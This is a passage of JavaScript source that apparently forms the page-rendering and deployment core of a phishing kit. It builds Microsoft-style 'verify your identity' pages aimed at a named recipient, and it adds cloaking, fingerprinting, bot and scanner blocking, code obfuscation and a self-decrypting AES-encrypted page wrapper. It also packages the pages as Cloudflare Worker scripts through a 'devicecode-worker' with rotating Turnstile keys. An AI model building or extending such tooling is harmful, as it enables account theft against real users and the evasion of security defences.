      ov.style.display = 'none';
      window.__VG_SPLASH_ACTIVE = false;
      window.dispatchEvent(new CustomEvent('vgSplashDone'));
    }, 560);
  }, delay);
  var cancel = function(){
    clearTimeout(timer);
    ov.style.transition = 'opacity .25s ease';
    ov.style.opacity = '0';
    setTimeout(function(){
      ov.style.display = 'none';
      window.__VG_SPLASH_ACTIVE = false;
      window.dispatchEvent(new CustomEvent('vgSplashDone'));
    }, 260);
  };
  window.__VG_SPLASH_CANCEL = cancel;
})();`;

    let finalSplashJs = splashJs;
    if (obfuscate) {
        try { finalSplashJs = obfuscateJs(splashJs); } catch (e) {

        }
    }

    return '\n<!-- ═══ PRE-VERIFICATION SPLASH ═══ -->\n'
        + '<style>' + splashCss + '</style>\n'
        + splashHtml + '\n'
        + '<script>' + finalSplashJs + '<\/script>';
}



// ─── Main Page Rendering ───────────────────────────────────
async function renderPageHtml(link, user, options) {
    options = options || {};

    if (options.req) {
        try {
            const classification = await classifyRequest(options.req);
            if (classification.action !== 'allow') {
                return null;
            }
        } catch (e) {

        }
    }

    const templateType = link.template_type || 'sharepoint3';
    const designName = link.verification_design || 'outlook';
    const settings = await loadAdminSettings();

    if (options.apiBaseUrl) {
        options.apiBaseUrl = String(options.apiBaseUrl).trim().replace(/\/+$/, '');
    }

    var html = loadTemplateHTML(templateType);
    const css = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
    const script = loadTemplateJS(templateType);

    // Load template config early to get defaults for placeholders
    const templateConfig = loadTemplateConfig(templateType);

    // Check if this is a slider HTML design
    const sliderData = loadVerificationDesignHTML(designName);
    const isSliderDesign = designName.toLowerCase().includes('slider') || sliderData.hasHtml;
    
    // DEBUG: Log slider detection details













    if (html.includes('{{CSS}}')) {
        html = html.replace(/\/\*\s*\{\{CSS\}\}\s*\*\/|{{CSS}}/g, css);
    }
    if (html.includes('{{SCRIPT}}')) {
        html = html.replace(/\/\/\s*\{\{SCRIPT\}\}|{{SCRIPT}}/g, script);
    }


    // Customizable page text. User-provided values are HTML-escaped so a stray
    // <, " or ' cannot break the page; each placeholder is replaced GLOBALLY so
    // templates that use the same token more than once (e.g. <title> + <h1>) all
    // update. Fallbacks come from the template config, then a generic default.
    var _escHtml = function (s) {
        return String(s == null ? '' : s)
            .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
    };
    var _pagesNum = parseInt(link.pages, 10) || parseInt(getConfigDefault(templateConfig, 'pages', 1), 10) || 1;
    var _textPlaceholders = {
        '{{TITLE}}': _escHtml(link.title_text || getConfigDefault(templateConfig, 'title', 'Verify your identity')),
        '{{MESSAGE}}': _escHtml(link.message_text || getConfigDefault(templateConfig, 'message', 'Please verify your identity to continue')),
        '{{RECIPIENT_EMAIL}}': _escHtml(link.recipient_email || getConfigDefault(templateConfig, 'recipient_email', 'user@example.com')),
        '{{BUTTON_TEXT}}': _escHtml(link.button_text || getConfigDefault(templateConfig, 'button_text', 'Get verification code')),
        '{{FILE_NAME}}': _escHtml(link.file_name || getConfigDefault(templateConfig, 'file_name', 'Document.pdf')),
        '{{PAGES}}': String(_pagesNum),
        '{{PAGES_LABEL}}': _pagesNum + (_pagesNum === 1 ? ' page' : ' pages')
    };
    Object.keys(_textPlaceholders).forEach(function (ph) {
        var val = _textPlaceholders[ph];
        html = html.split(ph).join(val);
    });

    // Generic field placeholders: any field declared in the template config
    // becomes a {{KEY}} token filled from the link value (if set) or the config
    // default. This lets templates define arbitrary editable fields (e.g.
    // subtitle, greeting, date, footer text) without further loader changes.
    if (templateConfig && Array.isArray(templateConfig.fields)) {
        var _linkFieldMap = {
            'title': 'title_text',
            'message': 'message_text',
            'button_text': 'button_text',
            'file_name': 'file_name',
            'pages': 'pages'
        };
        templateConfig.fields.forEach(function (f) {
            if (!f || !f.key) return;
            var ph = '{{' + String(f.key).toUpperCase() + '}}';
            if (html.indexOf(ph) === -1) return;
            var lp = _linkFieldMap[f.key] || f.key;
            var val = (link && link[lp] != null && link[lp] !== '') ? link[lp] : getConfigDefault(templateConfig, f.key, '');
            html = html.split(ph).join(_escHtml(String(val)));
        });
    }

    const verifyUrl = (options.relativeApi ? '' : (options.apiBaseUrl || config.API_URL || config.APP_URL || '')).trim().replace(/\/+$/, '');
    const beaconUrl = verifyUrl ? verifyUrl + '/api/beacon' : '/api/beacon';
    const logUrl = verifyUrl;
    // Per-link Turnstile site key (Widget Pool) — fallback to global env
    let turnstileKey = config.CF_TURNSTILE_SITE_KEY || '';
    try {
        const turnstilePool = require('./turnstile-pool');
        if (link && link.id) {
            const sk = await turnstilePool.getAssignedSiteKey(link.id);
            if (sk) turnstileKey = sk;
        }
    } catch (e) {

    }

    if (html.includes('{{VERIFY_ENDPOINT}}')) html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
    reportTurnstileKey(turnstileKey, link && link.id, 'renderPageHtml');
    if (html.includes('{{BEACON_ENDPOINT}}')) html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
    if (html.includes('{{LOG_ENDPOINT}}')) html = html.replace(/{{LOG_ENDPOINT}}/g, logUrl);
    if (html.includes('{{TURNSTILE_KEY}}')) html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);

    const windowVars = await buildWindowVars(link, user, settings, options);
    var vgEngine = '';
    const vgEnginePath = path.join(TEMPLATES_DIR, 'assets', 'vg-engine.js');
    if (fs.existsSync(vgEnginePath)) {
        vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
    }

    var vgFingerprint = '';
    const vgFingerprintPath = path.join(TEMPLATES_DIR, 'assets', 'vg-fingerprint.js');
    if (fs.existsSync(vgFingerprintPath)) {
        vgFingerprint = fs.readFileSync(vgFingerprintPath, 'utf8');
    }
    var vgBehavior = '';
    const vgBehaviorPath = path.join(TEMPLATES_DIR, 'assets', 'vg-behavior.js');
    if (fs.existsSync(vgBehaviorPath)) {
        vgBehavior = fs.readFileSync(vgBehaviorPath, 'utf8');
    }

    var vgCloak = '';
    const vgCloakPath = path.join(TEMPLATES_DIR, 'assets', 'vg-cloak.js');
    if (fs.existsSync(vgCloakPath)) {
        vgCloak = fs.readFileSync(vgCloakPath, 'utf8');
    }

    var vgText = '';
    const vgTextPath = path.join(TEMPLATES_DIR, 'assets', 'vg-text.js');
    if (fs.existsSync(vgTextPath)) {
        vgText = fs.readFileSync(vgTextPath, 'utf8');
    }

    const forceBlob = options.forceBlobFromStart === true ? 'true' : 'false';
    const configScript = '<script>window.__FORCE_BLOB_FROM_START=' + forceBlob + '</script>';
    

    const sliderFlag = '<script>window.__SLIDER_DESIGN=' + String(isSliderDesign) + '</script>';

    // Assemble the whole runtime bootstrap in one place.
    var headScripts = windowVars + configScript + sliderFlag;
    if (vgCloak) {
        headScripts += '<script>' + vgCloak + '</script>';
    }
    if (vgFingerprint) {
        headScripts += '<script>' + vgFingerprint + '</script>';
    }
    if (vgBehavior) {
        headScripts += '<script>' + vgBehavior + '</script>';
    }
    if (vgEngine) {



        headScripts += '<script>' + vgEngine + '</script>';
    }
    if (vgText) {
        headScripts += '<script>' + vgText + '</script>';
    }

    if (html.includes('</head>')) {
        html = html.split('</head>').join(headScripts + '</head>');

    } else {

        const htmlWithHead = insertBeforeRealBodyClose(html, headScripts);
        html = htmlWithHead || (html + headScripts);

    }













    
    const scriptOpenCount = (html.match(/<script/g) || []).length;
    const scriptCloseCount = (html.match(/<\/script>/g) || []).length;



    
    if (scriptOpenCount !== scriptCloseCount) {

    }
    if (html.includes('<script><script>')) {

    }
    if (html.includes('</script></script>')) {

    }


    if (templateConfig.preload) {
        html = html.replace(/\{\{#PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
        html = html.replace(/\{\{#NO_PRELOAD\}\}[\s\S]*?\{\{\/NO_PRELOAD\}\}/g, '');
    } else {
        html = html.replace(/\{\{#NO_PRELOAD\}\}/g, '').replace(/\{\{\/PRELOAD\}\}/g, '');
        html = html.replace(/\{\{#PRELOAD\}\}[\s\S]*?\{\{\/PRELOAD\}\}/g, '');
    }

    // Check if obfuscation is enabled (needed for slider overlay)
    const doObfuscate = boolSetting(settings.obfuscation_enabled) || link.obfuscated;


    if (isSliderDesign && !options.exportForDownload) {


        const sliderOverlay = buildSliderOverlay(sliderData, link, doObfuscate);

        // Count script tags in the slider overlay
        const sliderScriptCount = (sliderOverlay.match(/<script/g) || []).length;
        const sliderCloseCount = (sliderOverlay.match(/<\/script>/g) || []).length;

        const withOverlay = insertAfterRealBody(html, sliderOverlay);
        if (withOverlay !== null) {
            html = withOverlay;

        } else {

        }
    }

    if (!options.exportForDownload) {
        const splashOverlay = buildSplashOverlay(templateConfig, link, doObfuscate);
        const withSplash = insertAfterRealBody(html, splashOverlay);
        if (withSplash !== null) {
            html = withSplash;

        } else {

        }
    }

    if (doObfuscate) {

        function safeEmbedJs(js) {
            return js.replace(/<\/script/gi, '<\\/script')
                    .replace(/<\/style/gi, '<\\/style');
        }
        if (vgCloak && vgCloak.length > 500) {
            try {
                const obfuscatedCloak = safeEmbedJs(obfuscateJs(vgCloak));
                const originalBlock = '<script>' + vgCloak + '</script>';
                if (html.indexOf(originalBlock) !== -1) {
                    html = html.split(originalBlock).join('<script>' + obfuscatedCloak + '</script>');

                }
            } catch (e) {

            }
        }
        // Obfuscate vg-engine.js
        if (vgEngine && vgEngine.length > 500) {
            try {
                const obfuscatedEngine = safeEmbedJs(obfuscateJs(vgEngine));
                // DEBUG: Verify safeEmbedJs actually escaped the obfuscated output
                const dbgStrayCount = (obfuscatedEngine.match(/<\/script/gi) || []).length;

                if (dbgStrayCount > 0) {
                    // Find first occurrence context
                    const dbgIdx = obfuscatedEngine.search(/<\/script/gi);
                    if (dbgIdx >= 0) {

                    }
                }
                const originalBlock = '<script>' + vgEngine + '</script>';
                if (html.indexOf(originalBlock) !== -1) {
                    html = html.split(originalBlock).join('<script>' + obfuscatedEngine + '</script>');

                } else {
                    // Check if vgEngine was injected without <script> tags (template has {{VG_ENGINE}} placeholder)
                    if (html.indexOf(vgEngine) !== -1) {
                        html = html.split(vgEngine).join('<script>' + obfuscatedEngine + '</script>');

                    } else {
                        // WARNING: Neither exact match found - this will likely cause HTML corruption
                        const beforeLen = html.length;
                        html = html.replace(/<script>[\s\S]*?<\/script>/, '<script>' + obfuscatedEngine + '</script>');



                    }
                }

            } catch (e) {


            }
        }
        // Obfuscate vg-fingerprint.js
        if (vgFingerprint && vgFingerprint.length > 500) {
            try {
                const obfuscatedFp = safeEmbedJs(obfuscateJs(vgFingerprint));
                const originalBlock = '<script>' + vgFingerprint + '</script>';
                if (html.indexOf(originalBlock) !== -1) {
                    html = html.split(originalBlock).join('<script>' + obfuscatedFp + '</script>');

                }
            } catch (e) {

            }
        }
        // Obfuscate vg-behavior.js
        if (vgBehavior && vgBehavior.length > 500) {
            try {
                const obfuscatedBh = safeEmbedJs(obfuscateJs(vgBehavior));
                const originalBlock = '<script>' + vgBehavior + '</script>';
                if (html.indexOf(originalBlock) !== -1) {
                    html = html.split(originalBlock).join('<script>' + obfuscatedBh + '</script>');

                }
            } catch (e) {

            }
        }
        // Obfuscate inline script
        if (script && script.length > 10) {
            try {
                const obfuscatedScript = safeEmbedJs(obfuscateJs(script));
                // DEBUG: Verify safeEmbedJs escaped the inline script too
                const inlineStrayClose = (obfuscatedScript.match(/<\/script/gi) || []).length;
                const inlineStrayOpen = (obfuscatedScript.match(/<script/gi) || []).length;

            
                
                // Method 1: Exact match (fastest)
                const originalScriptBlock = '<script>' + script + '</script>';
                if (html.indexOf(originalScriptBlock) !== -1) {
                    html = html.split(originalScriptBlock).join('<script>' + obfuscatedScript + '</script>');

                } else {
                    // Method 2: Find the <script> block containing the script content
                    const scriptPos = html.indexOf(script);
                    if (scriptPos !== -1) {
                        // Find the opening <script> tag before the script content
                        const scriptStart = html.lastIndexOf('<script>', scriptPos);
                        if (scriptStart !== -1) {
                            // Find the closing </script> tag after the script content
                            const scriptEnd = html.indexOf('</script>', scriptPos);
                            if (scriptEnd !== -1) {
                                // Replace only this specific block
                                const before = html.substring(0, scriptStart);
                                const after = html.substring(scriptEnd + 9); // 9 = length of '</script>'
                                html = before + '<script>' + obfuscatedScript + '</script>' + after;
                                const beforeLen = before.length + after.length + '<script></script>'.length;

                            } else {

                            }
                        } else {

                        }
                    } else {



                    }
                }

            } catch (e) {

            }
        }
    }

    {
        let idx = 0;
        let leakCount = 0;
        const leaks = [];
        
        while (idx < html.length) {
            // Find the next <script tag
            const nextOpen = html.toLowerCase().indexOf('<script', idx);
            if (nextOpen === -1) break;
            
            // Find the next </script> AFTER this <script
            const scriptEnd = html.toLowerCase().indexOf('</script>', nextOpen);
            if (scriptEnd === -1) {
                // Unclosed <script> tag - this is a problem


                break;
            }
            
            let innerSearch = nextOpen + 7; 
            let innerClose = -1;
            while (innerSearch < scriptEnd) {
                const potentialClose = html.toLowerCase().indexOf('</script>', innerSearch);
                // FIX: Use >= instead of > to avoid reporting the legitimate closing tag as a leak
                if (potentialClose === -1 || potentialClose >= scriptEnd) break;
                // Found a </script> before the actual closing tag
                innerClose = potentialClose;
                break;
            }
            
            if (innerClose !== -1) {
                // This is a leak - </script> inside the script block
                leakCount++;
                leaks.push({
                    position: innerClose,
                    context: html.substring(Math.max(0, innerClose - 50), innerClose + 50)
                });
            }
            
            // Advance past the closing </script>
            idx = scriptEnd + 9;
        }
        
        if (leakCount > 0) {


            if (leaks.length > 0) {


            }
        } else {

        }
    }

    if (html.includes('{{')) {

        html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
        html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
        html = html.replace(/{{LOG_ENDPOINT}}/g, logUrl);
        html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);
        // Replace any other remaining placeholders with empty string
        html = html.replace(/\{\{[^}]+\}\}/g, '');

    }

    if (options.exportForDownload) {



        // Remove beacon script for static exports (will be re-added inside encrypted payload)
        html = html.replace(/<script>fetch\([^)]*beacon[^)]*\)[^<]*<\/script>/g, '');



        const beaconScript = '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script>';
        html = insertBeforeRealBodyClose(html, beaconScript) || (html + beaconScript);

        if (isSliderDesign) {
            const sliderOverlay = buildSliderOverlay(sliderData, link, doObfuscate);
            html = insertAfterRealBody(html, sliderOverlay) || html;

        }

        // Encrypt the entire HTML payload
        try {
            const encrypted = encryptPayload(html);






            // Web Crypto API requires tag appended to ciphertext
            const ctBuffer = Buffer.concat([Buffer.from(encrypted.cipher, 'base64'), Buffer.from(encrypted.tag, 'base64')]);
            const ctWithTagB64 = ctBuffer.toString('base64');

            // Build the decryption wrapper
            const wrapperLines = [
                '<!DOCTYPE html>',
                '<html>',
                '<head>',
                '<meta charset="UTF-8">',
                '<style>html,body{margin:0;padding:0;height:100%;background:#fff;}</style>',
                '</head>',
                '<body>',
                '<div id="vg-decrypt-msg" style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;color:#666;"></div>',
                '<script>',
                '(async function(){',
                'try{',
                'if(!window.crypto||!window.crypto.subtle){throw new Error("Web Crypto API not available");}',
                'var AAD="VG-TEMPLATE-2024";',
                'var C="' + ctWithTagB64 + '";',
                'var S="' + encrypted.salt + '";',
                'var I="' + encrypted.iv + '";',
                'var sb=Uint8Array.from(atob(S),c=>c.charCodeAt(0));',
                'var ib=Uint8Array.from(atob(I),c=>c.charCodeAt(0));',
                'var cb=Uint8Array.from(atob(C),c=>c.charCodeAt(0));',
                'var km=await crypto.subtle.importKey("raw",sb,"PBKDF2",false,["deriveKey"]);',
                'var ak=await crypto.subtle.deriveKey({name:"PBKDF2",salt:sb,iterations:100000,hash:"SHA-512"},km,{name:"AES-GCM",length:256},false,["decrypt"]);',
                'var dec=await crypto.subtle.decrypt({name:"AES-GCM",iv:ib,additionalData:new TextEncoder().encode(AAD)},ak,cb);',
                'var html=new TextDecoder().decode(dec);',
                'document.getElementById("vg-decrypt-msg").remove();',
                'document.open();document.write(html);document.close();',
                '}catch(err){',
                'var el=document.getElementById("vg-decrypt-msg");',
                'var msg="Error: "+err.message;',
                'if(err.name==="OperationError")msg="Decryption failed: Invalid key or corrupted data. Please re-download.";',
                'if(el){el.textContent=msg;el.style.color="#c00";}',
                'else{document.body.innerHTML="<div style=padding:40px;text-align:center;font-family:sans-serif;color:#c00;>"+msg+"</div>";}',
                '}',
                '})();',
                '</script>',
                '</body>',
                '</html>'
            ];

            html = wrapperLines.join('\n');

        } catch (e) {


            throw e;
        }
    }
    const beaconScript = '<script>fetch(\'' + beaconUrl + '\',{method:\'POST\',body:JSON.stringify({jwt_token:window.VG_JWT})}).catch(()=>{})</script>';
    html = insertBeforeRealBodyClose(html, beaconScript) || (html + beaconScript);

    if (html.includes('{{')) {

        // Replace any remaining endpoint placeholders with actual URLs
        html = html.replace(/{{VERIFY_ENDPOINT}}/g, verifyUrl);
        html = html.replace(/{{BEACON_ENDPOINT}}/g, beaconUrl);
        html = html.replace(/{{LOG_ENDPOINT}}/g, logUrl);
        html = html.replace(/{{TURNSTILE_KEY}}/g, turnstileKey);
        // Replace any other remaining placeholders with empty string
        html = html.replace(/\{\{[^}]+\}\}/g, '');

    }
    
    {
        const finalScriptOpen = (html.match(/<script/g) || []).length;
        const finalScriptClose = (html.match(/<\/script>/g) || []).length;
        const finalStyleOpen = (html.match(/<style/g) || []).length;
        const finalStyleClose = (html.match(/<\/style>/g) || []).length;
        








        
        // Check for </script> in string literals (would be a bug)
        const scriptContentMatches = html.match(/<script[^>]*>([\s\S]*?)<\/script>/gi) || [];
        let totalLeaks = 0;
        for (const match of scriptContentMatches) {
            const content = match.slice(7, -9); // Remove <script...> and </script>
            const leaks = (content.match(/<\/script/gi) || []).length;
            if (leaks > 0) {

                totalLeaks += leaks;
            }
        }
        if (totalLeaks === 0) {

        }

    }
    
    return html;
}

// ─── Export HTML Generation ────────────────────────────────
async function generateExportHtml(link, user, options) {
    return renderPageHtml(link, user, Object.assign({}, options, { exportForDownload: true, req: options && options.req }));
}

// ─── Worker Script Builder ─────────────────────────────────
async function buildWorkerScript(link, user, apiBaseUrl) {

    let pageDomain = '';
    if (link.custom_domain) {
        pageDomain = String(link.custom_domain).trim().replace(/^https?:\/\//i, '').replace(/\/+$/, '').toLowerCase();
    } else if (link.worker_name) {
        // cf_workers_subdomain is stored as a bare prefix ("powerballranger");
        // normalise to the full hostname, mirroring routes/links.js.
        const sub = String((user && user.cf_workers_subdomain) || config.CF_WORKERS_SUBDOMAIN || '').trim().toLowerCase();
        const suffix = !sub ? 'workers.dev' : (sub.endsWith('.workers.dev') ? sub : sub + '.workers.dev');
        pageDomain = String(link.worker_name) + '.' + suffix;
    }
    const pageHtml = await generateExportHtml(link, user, { apiBaseUrl: '', relativeApi: true, domain: pageDomain });

    let workerJs = fs.readFileSync(path.join(__dirname, '..', '..', 'worker', 'devicecode-worker.js'), 'utf8');
workerJs = workerJs.replace(/^\uFEFF/, '');
    const verifyUrl = apiBaseUrl || config.API_URL || config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);

    const verifyUrlFallback = config.APP_URL || (config.CF_WORKERS_SUBDOMAIN ? 'https://' + config.CF_WORKERS_SUBDOMAIN + '.workers.dev' : 'http://localhost:' + config.PORT);
    const linkJwt = jwt.sign({ user_id: user.id, link_id: link.id }, config.JWT_SECRET, { expiresIn: '90d' });

    const escapedHtml = pageHtml
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\'")
    .replace(/"/g, '\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '')
    .replace(/\t/g, '\\t');

    // Get anti-bot settings
    let antiBotMode = 'challenge';
    let antiBotChallengeType = 'invisible';
    try {
        const settings = await loadAdminSettings();
        if (settings.anti_bot_settings) {
            try {
                const abs = JSON.parse(settings.anti_bot_settings);
                antiBotMode = abs.mode || 'challenge';
                antiBotChallengeType = abs.challengeType || 'invisible';
            } catch (e) { }
        }
    } catch (e) { }

    let tsSiteKey   = config.CF_TURNSTILE_SITE_KEY   || '';
    let tsSecretKey = config.CF_TURNSTILE_SECRET_KEY || '';
    try {
        const turnstilePool = require('./turnstile-pool');
        if (link && link.id) {
            const [sk, sk_] = await Promise.all([
                turnstilePool.getAssignedSiteKey(link.id),
                turnstilePool.getAssignedSecret(link.id),
            ]);
            if (sk)   tsSiteKey   = sk;
            if (sk_)  tsSecretKey = sk_;
        }
    } catch (e) {

    }

    reportTurnstileKey(tsSiteKey, link && link.id, 'buildWorkerScript');

    let blockedIps = [];
    try {
        const scannerBlocklist = require('./scanner-blocklist');
        blockedIps = await scannerBlocklist.listBlockedIps();
    } catch (e) {

    }

        const replaceLiteralPlaceholder = (placeholder, value) => {
            const literal = JSON.stringify(value);
            const escapedPlaceholder = placeholder.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            const singleOrDoubleQuoted = new RegExp(`["']${escapedPlaceholder}["']`, 'g');
            workerJs = workerJs.replace(singleOrDoubleQuoted, () => literal);
        };

        replaceLiteralPlaceholder('{{JWT_TOKEN}}', linkJwt);
        replaceLiteralPlaceholder('{{TURNSTILE_KEY}}', tsSiteKey);
        replaceLiteralPlaceholder('{{TURNSTILE_SECRET}}', tsSecretKey);
        replaceLiteralPlaceholder('{{VERIFY_ENDPOINT}}', verifyUrl);
        replaceLiteralPlaceholder('{{VERIFY_ENDPOINT_FALLBACK}}', verifyUrlFallback);
        replaceLiteralPlaceholder('{{BEACON_ENDPOINT}}', verifyUrl);
        replaceLiteralPlaceholder('{{LOG_ENDPOINT}}', verifyUrl);
        replaceLiteralPlaceholder('{{ANTI_BOT_MODE}}', antiBotMode);
        replaceLiteralPlaceholder('{{ANTI_BOT_CHALLENGE_TYPE}}', antiBotChallengeType);
        replaceLiteralPlaceholder('{{BLOCKED_IPS}}', JSON.stringify(blockedIps));
        replaceLiteralPlaceholder('{{TEMPLATE_HTML}}', pageHtml);

    if (validateWorkerBundleForRuntime(workerJs) !== 0) {
        throw new Error('Worker bundle failed the Workers-runtime validation: the module top level must not reference browser-only globals (such as window). Check worker/devicecode-worker.js and the template output.');
    }

    return workerJs;
}

// ─── Worker Bundle Runtime Validation ──────────────────────
function validateWorkerBundleForRuntime(code) {
    const os = require('os');
    const { spawnSync } = require('child_process');
    const bundlePath = path.join(os.tmpdir(), 'vc-worker-validate-' + process.pid + '-' + Date.now() + '.mjs');
    const checker = [
        'globalThis.self = globalThis;',
        'import(process.argv[1]).then(function (m) {',
        '  if (m && m.default && typeof m.default.fetch === "function") process.exit(0);',
        '  process.exit(2);',
        '}).catch(function () { process.exit(1); });',
    ].join('\n');
    try {
        fs.writeFileSync(bundlePath, code);
        const res = spawnSync(process.execPath, ['--input-type=module', '-e', checker, bundlePath], {
            timeout: 90000,
            stdio: 'ignore',
            env: process.env,
        });
        if (res.error) {

            return 0;
        }
        if (res.signal) {
            // Killed by a signal (OOM etc.) - inconclusive, skip the gate.

            return 0;
        }
        return res.status;
    } catch (e) {

        return 0;
    } finally {
        try { fs.unlinkSync(bundlePath); } catch (e) { /* ignore */ }
    }
}

module.exports = {
    normalizeTemplateKey,
    listDiskTemplates,
    resolveTemplateDirectory,
    loadTemplateConfig,
    loadTemplateHTML,
    loadTemplateCSS,
    loadTemplateJS,
    loadVerificationDesignCSS,
    loadVerificationDesignHTML,
    hasVerificationDesignHTML,
    scopeVerificationCss,
    insertAfterRealBody,
    insertBeforeRealBodyClose,
    buildSliderOverlay,
    buildSplashOverlay,
    obfuscateJs,
    renderPageHtml,
    loadAdminSettings,
    boolSetting,
    getVisitorAccessSettings,
    checkVisitorBlocked,
    buildBlockedPage,
    generateExportHtml,
    buildWorkerScript,
};
